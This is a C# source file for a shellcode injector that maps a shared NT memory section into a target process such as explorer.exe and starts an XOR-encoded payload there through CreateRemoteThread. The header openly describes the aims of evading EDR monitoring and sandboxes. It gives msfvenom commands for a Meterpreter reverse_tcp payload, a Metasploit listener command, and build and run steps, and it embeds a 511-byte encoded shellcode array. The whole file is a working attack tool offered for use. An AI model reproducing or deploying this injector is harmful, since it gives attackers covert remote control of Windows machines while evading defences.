// ================================================================
// sections-runner.cs — Section-Based Process Injection via NT APIs (XOR Encoded)
// ================================================================
// WHAT THIS DOES:
//   A more advanced shellcode injection technique that avoids the common
//   VirtualAllocEx + WriteProcessMemory pattern (heavily monitored by EDRs).
//
//   Instead of writing directly to the target process, this tool:
//     1. Creates a shared memory SECTION using NtCreateSection (NT API)
//     2. Maps a READ-WRITE view of the section into OUR (local) process
//     3. Maps a READ-EXECUTE view of the SAME section into the TARGET process
//     4. XOR-decodes the shellcode and writes it to our LOCAL mapping
//        (since both views share the same physical memory, the shellcode
//        automatically appears in the target with NO WriteProcessMemory call)
//     5. Creates a remote thread in the target at the remote mapping address
//
// WHY THIS IS MORE EVASIVE:
//   - No VirtualAllocEx call (heavily monitored by EDRs)
//   - No WriteProcessMemory into the remote process (no cross-process write)
//   - Uses NT-level syscalls (ntdll.dll, lower in the call stack)
//   - The shellcode "write" looks like a local memcpy from outside
//   - NUMA check at startup to exit if running in a sandbox
//
// ----------------------------------------------------------------
// BEFORE YOU COMPILE — PREPARE YOUR SHELLCODE
// ----------------------------------------------------------------
//
// STEP 1 — GENERATE RAW SHELLCODE (on Kali):
//   msfvenom -p windows/x64/meterpreter/reverse_tcp \
//     LHOST=<YOUR_IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin
//
// STEP 2 — XOR ENCODE (key 0xfa):
//   python3 04-encoders/xor/xor_encoder.py shell.bin mykey xor -cs
//   Open ./result/encryptedShellcodeWrapper_xor.cs and copy the byte array.
//
//   OR encode manually in Python:
//     with open('shell.bin','rb') as f: data=f.read()
//     enc = bytes(b ^ 0xfa for b in data)
//     print(','.join(f'0x{b:02x}' for b in enc))
//
// STEP 3 — PASTE YOUR ENCODED SHELLCODE:
//   Replace the buf = new byte[511] {...} array in Main() with your bytes.
//   Update the array size to match your actual byte count.
//
// STEP 4 — SET YOUR TARGET PROCESS:
//   Find the line:   string targetedProc = "explorer";
//   Change "explorer" to any running process you want to inject into.
//   Good choices: explorer, notepad, svchost, spoolsv
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows, run as Administrator):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /unsafe /platform:x64 /out:sections.exe sections-runner.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it anything, Framework: .NET Framework 4.x, click Create
//     3. Properties -> Build -> Platform target: x64
//     4. Delete ALL existing code in Program.cs
//     5. Paste THIS ENTIRE FILE into Program.cs
//     6. Build -> Build Solution (Ctrl+Shift+B)
//     7. Find your .exe in: bin\x64\Debug\sections.exe (or your project name)
//
// ----------------------------------------------------------------
// RUN
// ----------------------------------------------------------------
//
//   Start your listener first (on Kali):
//     msfconsole -q -x "use exploit/multi/handler; \
//       set payload windows/x64/meterpreter/reverse_tcp; \
//       set LHOST <YOUR_IP>; set LPORT 443; exploit -j"
//
//   Then on target Windows (as a user who can open a handle to the target process):
//     .\sections.exe
//
//   The tool will print debug output showing each step.
//   "Injection complete! Check your listener." means success.
//
// NOTES:
//   - The NUMA sandbox check will exit immediately if run in a VM without NUMA
//     (this is intentional evasion — can remove it if testing in a VM)
//   - The debug ReadProcessMemory verification block can be removed in production
//   - Target process must be running before you execute this
//
// BEFORE RUNNING, CHANGE:
//   - buf[] array       -> your XOR-encoded shellcode (with YOUR IP/PORT)
//   - targetedProc      -> the process name you want to inject into
// ================================================================

using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace RemoteShinjectLowlevel
{
    class Program
    {
        // -------------------------------------------------------
        // DEBUGGING HELPERS (remove in production)
        // -------------------------------------------------------
        // ReadProcessMemory: Used to verify shellcode is correctly placed remotely
        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        // memcmp: Compare two byte arrays using native C runtime (fast)
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        static extern int memcmp(byte[] b1, byte[] b2, long count);

        // ByteArrayCompare: Helper to check if two byte arrays are identical
        static bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }

        // -------------------------------------------------------
        // Constants
        // -------------------------------------------------------
        public const uint ProcessAllFlags       = 0x001F0FFF;  // PROCESS_ALL_ACCESS
        public const uint GenericAll            = 0x10000000;  // GENERIC_ALL (for section)
        public const uint PageReadWrite         = 0x04;        // PAGE_READWRITE (local view - we write here)
        public const uint PageReadExecute       = 0x20;        // PAGE_EXECUTE_READ (remote view - target executes here)
        public const uint PageReadWriteExecute  = 0x40;        // PAGE_EXECUTE_READWRITE (for NtCreateSection)
        public const uint SecCommit             = 0x08000000;  // SEC_COMMIT (section backed by pagefile)

        // -------------------------------------------------------
        // Win32 / NT API imports
        // -------------------------------------------------------

        // OpenProcess: Get handle to target process (same as in basic injection)
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // NtCreateSection: Create a new memory section object.
        // A section is a shared memory object — multiple processes can map views of it.
        // Parameters:
        //   SectionHandle:        receives the handle to the new section
        //   DesiredAccess:        GENERIC_ALL access
        //   ObjectAttributes:     NULL (no special attributes)
        //   MaximumSize:          size of the section (= shellcode size)
        //   SectionPageProtection: PAGE_EXECUTE_READWRITE (max protection needed)
        //   AllocationAttributes: SEC_COMMIT (backed by pagefile, not a file)
        //   FileHandle:           NULL (memory-backed, not file-backed)
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes,
            ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        // NtMapViewOfSection: Map a view of a section into a process's address space.
        // This is how we make the section accessible in both local and remote processes.
        // Parameters:
        //   SectionHandle:     the section we created with NtCreateSection
        //   ProcessHandle:     which process to map into (use GetCurrentProcess() for local)
        //   BaseAddress:       receives the address where the section was mapped
        //   InheritDisposition: 2 = ViewUnmap (not inherited by child processes)
        //   Win32Protect:      PAGE_READWRITE for local, PAGE_EXECUTE_READ for remote
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress,
            IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out uint ViewSize,
            uint InheritDisposition, uint AllocationType, uint Win32Protect);

        // NtUnmapViewOfSection: Unmap a view we previously mapped.
        // Good practice to clean up after ourselves (optional but cleaner).
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        // NtClose: Close an NT handle (section handle in our case)
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        // CreateRemoteThread: Create a thread in the target process at our shellcode address.
        // This is still needed — the NT equivalent (NtCreateThreadEx) is more complex.
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // NUMA check for sandbox evasion (same as basic injection)
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            // -------------------------------------------------------
            // SANDBOX EVASION: NUMA allocation check
            // -------------------------------------------------------
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null) { return; }

            // -------------------------------------------------------
            // SHELLCODE (XOR encoded, key = 0xfa)
            // -------------------------------------------------------
            // REPLACE with your encoded payload for your IP/port.
            byte[] buf = new byte[511] {
            0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
            0xab, 0xac, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2,
            0x71, 0xa8, 0xda, 0xb7, 0xcb, 0x33, 0xb2, 0x71, 0x88, 0xaa, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
            0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
            0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xbb, 0xab, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xb2,
            0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
            0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0x71, 0xb2,
            0xe2, 0xaa, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2,
            0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33,
            0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
            0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
            0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
            0xbb, 0xa2, 0xa4, 0xa3, 0xb2, 0xfb, 0x2a, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
            0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
            0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb3, 0x44, 0x8d, 0x89, 0xc8, 0xa5, 0xc9, 0xc8, 0xfa, 0xfa,
            0xbb, 0xac, 0xb3, 0x73, 0x1c, 0xb2, 0x7b, 0x16, 0x5a, 0xfb, 0xfa, 0xfa, 0xb3, 0x73, 0x1f,
            0xb3, 0x46, 0xf8, 0xfa, 0xfb, 0x41, 0x3a, 0x52, 0x12, 0x7f, 0xbb, 0xae, 0xb3, 0x73, 0x1e,
            0xb6, 0x73, 0x0b, 0xbb, 0x40, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xb6, 0x73, 0x10, 0x92,
            0xfb, 0xfb, 0xfa, 0xfa, 0xa3, 0xbb, 0x40, 0xd3, 0x7a, 0x91, 0xfa, 0x05, 0x2f, 0x90, 0xf0,
            0xbb, 0xa4, 0xaa, 0xaa, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x3a, 0xb2, 0x05, 0x3a, 0xb2, 0x73,
            0x38, 0xb2, 0x05, 0x3a, 0xb2, 0x73, 0x3b, 0xbb, 0x40, 0x10, 0xf5, 0x25, 0x1a, 0x05, 0x2f,
            0xb2, 0x73, 0x3d, 0x90, 0xea, 0xbb, 0xa2, 0xb6, 0x73, 0x18, 0xb2, 0x73, 0x03, 0xbb, 0x40,
            0x63, 0x5f, 0x8e, 0x9b, 0x05, 0x2f, 0x7f, 0x3a, 0x8e, 0xf0, 0xb3, 0x05, 0x34, 0x8f, 0x1f,
            0x12, 0x69, 0xfa, 0xfa, 0xfa, 0xb2, 0x79, 0x16, 0xea, 0xb2, 0x73, 0x18, 0xb7, 0xcb, 0x33,
            0x90, 0xfe, 0xbb, 0xa2, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32, 0xa5, 0x05, 0x2f,
            0x79, 0x02, 0xfa, 0x84, 0xaf, 0xb2, 0x79, 0x3e, 0xda, 0xa4, 0x73, 0x0c, 0x90, 0xba, 0xbb,
            0xa3, 0x92, 0xfa, 0xea, 0xfa, 0xfa, 0xbb, 0xa2, 0xb2, 0x73, 0x08, 0xb2, 0xcb, 0x33, 0xbb,
            0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0x05, 0x2f, 0xb2, 0x73, 0x39, 0xb3, 0x73, 0x3d, 0xb7, 0xcb,
            0x33, 0xb3, 0x73, 0x0a, 0xb2, 0x73, 0x20, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32,
            0xa5, 0x05, 0x2f, 0x79, 0x02, 0xfa, 0x87, 0xd2, 0xa2, 0xbb, 0xad, 0xa3, 0x92, 0xfa, 0xba,
            0xfa, 0xfa, 0xbb, 0xa2, 0x90, 0xfa, 0xa0, 0xbb, 0x40, 0xf1, 0xd5, 0xf5, 0xca, 0x05, 0x2f,
            0xad, 0xa3, 0xbb, 0x40, 0x8f, 0x94, 0xb7, 0x9b, 0x05, 0x2f, 0xb3, 0x05, 0x34, 0x13, 0xc6,
            0x05, 0x05, 0x05, 0xb2, 0xfb, 0x39, 0xb2, 0xd3, 0x3c, 0xb2, 0x7f, 0x0c, 0x8f, 0x4e, 0xbb,
            0x05, 0x1d, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05,
            0x2f
            };

            int len = buf.Length;
            uint uLen = (uint)len;

            // -------------------------------------------------------
            // Get handles to local and remote processes
            // -------------------------------------------------------
            IntPtr lHandle = Process.GetCurrentProcess().Handle;  // handle to OUR process

            // CHANGE: target process to inject into
            string targetedProc = "explorer";
            int procId = Process.GetProcessesByName(targetedProc).First().Id;

            IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId);
            Console.WriteLine($"Got handle {pHandle} on PID {procId} ({targetedProc}).");

            // -------------------------------------------------------
            // STEP 1: Create a shared memory section
            // -------------------------------------------------------
            // NtCreateSection creates a pagefile-backed memory section.
            // Section size = shellcode length. Protection = RWX.
            // GenericAll gives us full control over the section object itself.
            IntPtr sHandle = new IntPtr();
            long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen,
                PageReadWriteExecute, SecCommit, IntPtr.Zero);
            Console.WriteLine($"Created section handle {sHandle}. Success: {cStatus == 0}.");

            // -------------------------------------------------------
            // STEP 2: Map section into LOCAL process (read-write, for writing shellcode)
            // -------------------------------------------------------
            // We map with PAGE_READWRITE — we can write shellcode here.
            // InheritDisposition=2 = ViewUnmap (don't inherit in child processes)
            IntPtr baseAddrL = new IntPtr();
            uint viewSizeL = uLen;
            ulong sectionOffsetL = new ulong();
            long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL,
                IntPtr.Zero, IntPtr.Zero, out sectionOffsetL, out viewSizeL,
                2,              // ViewUnmap
                0,              // AllocationType = 0 (no special)
                PageReadWrite); // PAGE_READWRITE for local view
            Console.WriteLine($"Mapped LOCAL view at {baseAddrL} (size: {viewSizeL}). Success: {mStatusL == 0}.");

            // -------------------------------------------------------
            // STEP 3: Map same section into REMOTE process (read-execute, for running)
            // -------------------------------------------------------
            // Same section, but mapped into the TARGET process with EXECUTE_READ permissions.
            // No write permission needed on the remote side — we write locally.
            IntPtr baseAddrR = new IntPtr();
            uint viewSizeR = uLen;
            ulong sectionOffsetR = new ulong();
            long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR,
                IntPtr.Zero, IntPtr.Zero, out sectionOffsetR, out viewSizeR,
                2,              // ViewUnmap
                0,
                PageReadExecute); // PAGE_EXECUTE_READ for remote view (can't write, can execute)
            Console.WriteLine($"Mapped REMOTE view at {baseAddrR} (size: {viewSizeR}). Success: {mStatusR == 0}.");

            // -------------------------------------------------------
            // STEP 4: XOR decode shellcode and write to LOCAL mapping
            // -------------------------------------------------------
            // Decode shellcode in place
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            // Write decoded shellcode to OUR local mapping.
            // The key insight: since both views (local and remote) map the SAME
            // physical memory, writing here automatically makes it visible in the
            // remote process at baseAddrR — with NO WriteProcessMemory call!
            Marshal.Copy(buf, 0, baseAddrL, len);
            Console.WriteLine($"Wrote shellcode to local mapping at {baseAddrL}.");

            // -------------------------------------------------------
            // STEP 5: DEBUG — Verify shellcode in remote process (remove in production)
            // -------------------------------------------------------
            byte[] remoteMemory = new byte[len];
            IntPtr noBytesRead = new IntPtr();
            bool result = ReadProcessMemory(pHandle, baseAddrR, remoteMemory, remoteMemory.Length, out noBytesRead);
            if (!ByteArrayCompare(buf, remoteMemory))
            {
                Console.WriteLine("DEBUG: Shellcode mismatch! Aborting.");
                return;
            }
            Console.WriteLine("DEBUG: Shellcode verified in remote process.");

            // -------------------------------------------------------
            // STEP 6: Execute shellcode in remote process
            // -------------------------------------------------------
            // CreateRemoteThread starts a thread in the target process at baseAddrR
            // (the remote mapping of our section). The shellcode runs in explorer.exe.
            if (CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
            {
                Console.WriteLine("Injection complete! Check your listener.");
            }

            // -------------------------------------------------------
            // CLEANUP (good practice)
            // -------------------------------------------------------
            // Unmap our local view (no longer needed)
            uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);
            Console.WriteLine($"Unmapped local section. Success: {uStatusL == 0}.");

            // Close the section handle
            int clStatus = NtClose(sHandle);
            Console.WriteLine($"Closed section handle. Success: {clStatus == 0}.");
        }
    }
}
